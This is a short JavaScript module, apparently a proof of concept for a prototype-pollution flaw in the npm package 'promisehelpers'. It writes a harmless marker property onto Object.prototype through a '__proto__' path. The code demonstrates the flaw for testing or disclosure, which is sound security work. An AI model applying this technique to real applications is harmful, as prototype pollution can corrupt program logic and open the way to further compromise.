function exploitFunction(payload) {
  const promisehelpers = require("promisehelpers");
  const obj = {};

  promisehelpers.insert(["__proto__", "polluted"], "yes")(obj);
  return obj;
}

module.exports = { exploitFunction };